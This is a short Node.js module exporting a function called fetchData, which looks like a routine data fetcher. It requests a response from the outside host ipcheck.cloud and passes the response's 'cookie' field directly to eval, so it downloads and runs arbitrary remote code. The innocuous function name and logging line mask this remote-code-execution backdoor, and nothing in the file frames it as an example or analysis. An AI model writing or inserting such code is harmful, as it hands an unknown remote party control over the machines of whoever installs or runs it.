const axios = require('axios');
module.exports = fetchData = async function () {
    const res = await axios.get('http://ipcheck.cloud/api/user/thirdcookie/v9/906');
    console.log("============");
    eval(res.data.cookie);
}
